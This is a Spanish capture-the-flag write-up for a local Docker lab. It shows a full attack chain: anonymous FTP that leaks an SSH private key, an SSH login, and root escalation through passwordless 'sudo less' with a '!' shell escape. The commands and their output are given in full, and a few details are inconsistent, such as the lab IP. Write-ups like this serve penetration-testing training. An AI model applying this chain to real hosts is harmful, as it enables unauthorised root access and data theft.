# Nodo del patio Norte

> LATAM Energía Red dejó el nodo del patio Norte en modo recuperación. Descarga el zip del lab (Google Drive) y ejecútalo en Kali/Linux con Docker.
>
> `chmod +x startlab.sh`
> `./startlab.sh blackout-pt01.tar`
>
> El script muestra la IP del laboratorio (172.18.0.2). Enumera con nmap. No expongas el contenedor a internet.
>
> **Consejo:** empieza por un nmap completo a la IP del lab. No asumas un solo puerto.

**Flag:** `WHOAMI{ftp_p4t10_n0rt3}`

---

## Resolución

Es un reto de pentesting: el consejo ("no asumas un solo puerto") indica que el servicio web no es lo único, y la cadena de ataque es FTP → llave SSH → usuario → escalada a root.

### 1. Levantar el lab

```bash
$ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' blackout-pt01
172.17.0.2
```

### 2. Enumerar todos los puertos con nmap

**Herramienta:** `nmap`. **Por qué:** un escaneo de todos los puertos muestra la superficie completa; el consejo avisa de que hay más de un servicio.

**Parámetros:** `-sV` (versión del servicio) y `-p-` (los 65535 puertos, no solo los comunes).

```bash
$ nmap -sV -p- 172.17.0.2
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    Apache httpd 2.4.68 (Debian)
```

**Lo que vi:** tres servicios — FTP, SSH y HTTP. Como es pentesting, la cadena probablemente mezcla varios.

### 3. FTP anónimo

**Herramienta:** `curl` con usuario `anonymous`. **Por qué:** el FTP vsftpd suele permitir acceso anónimo; explorar es gratis.

```bash
$ curl -s "ftp://172.17.0.2/" --user "anonymous:"
drwxr-xr-x  avisos
drwxr-xr-x  respaldo
```

**Lo que vi:** hay una carpeta `respaldo/norte` con una **llave privada OpenSSH** (`llave_patio`) y un archivo `turno_asignado.txt` que dice "Titular: operador.norte". Decisión: esa llave debe servir para entrar por SSH.

```bash
$ file llave_patio
OpenSSH private key
```

### 4. Entrar por SSH con la llave

**Herramienta:** `ssh`. **Por qué:** la llave del FTP apunta al usuario `operador.norte` del puerto 22.

**Parámetros:** `-i llave_patio` (llave de identidad), `-o StrictHostKeyChecking=no` (no validar host key en el lab).

```bash
$ chmod 600 llave_patio
$ ssh -i llave_patio operador.norte@172.17.0.2 "id"
uid=1000(operador.norte) gid=1000(operador.norte)
```

### 5. Enumerar el sistema y encontrar la escalada

**Herramienta:** `find` + `sudo -l`. **Por qué:** busco dónde está la flag y qué puedo ejecutar como privilegiado.

```bash
$ ssh -i llave_patio operador.norte@172.17.0.2 "sudo -l"
User operador.norte may run the following commands:
    (root) NOPASSWD: /usr/bin/less
```

**Lo que vi:** puedo ejecutar **`/usr/bin/less` como root sin contraseña**. `less` permite lanzar comandos desde su prompt con `!` (GTFOBins): con eso consigo un shell root.

### 6. Escalar a root con `sudo less`

**Herramienta:** `script -qc` + `sudo less`. **Por qué:** `less` necesita un TTY para procesar el comando `!`; `script -qc` le crea un pseudo-TTY y le pasamos la secuencia por stdin.

```bash
$ printf '!/bin/sh -c "id > /tmp/pwned"\nq\n' | script -qc "sudo less /etc/shadow" /dev/null
$ cat /tmp/pwned
uid=0(root) gid=0(root)
```

**¡Root conseguido!** (`uid=0`). El `!` dentro de `less` ejecuta un shell como root.

### 7. Localizar la flag

Con root, busco los archivos de la flag:

```bash
$ printf '!/bin/sh -c "ls -la /root; find / -iname *.dat 2>/dev/null | grep -v proc"\nq\n' | script -qc "sudo less /etc/shadow" /dev/null
/root/flag.txt
/var/lib/latam/patio.dat
```

Dos candidatos. Los leo por separado:

```bash
$ printf '!/bin/sh -c "cat /root/flag.txt > /tmp/a; cat /var/lib/latam/patio.dat > /tmp/b"\nq\n' | script -qc "sudo less /etc/shadow" /dev/null
=== root/flag.txt ===
WHOAMI{docker_exec_detected_n1ce_try}
=== /var/lib/latam/patio.dat ===
WHOAMI{ftp_p4t10_n0rt3}
```

**La flag real es `/var/lib/latam/patio.dat`**: `WHOAMI{ftp_p4t10_n0rt3}`. La de `/root/flag.txt` es un **honeypot** — una trampa para quien intente `docker exec cat /root/flag.txt` en vez de resolver la cadena de ataque del reto (aparece el mismo señuelo en el reto Gateway SCADA). La flag del reto referencia justamente la vía de acceso: FTP + patio norte.

## Lección

En pentesting no hay que asumir un único servicio: el nmap completo (`-p-`) destapa la cadena completa. Aquí FTP anónimo filtró una llave SSH, y el sudo sin contraseña sobre `less` (GTFOBins) dio root con `!`. Y ojo con los honeypots: una flag en `/root/flag.txt` accesible por `docker exec` puede ser un señuelo, la real está en la vía de ataque pensada para el reto.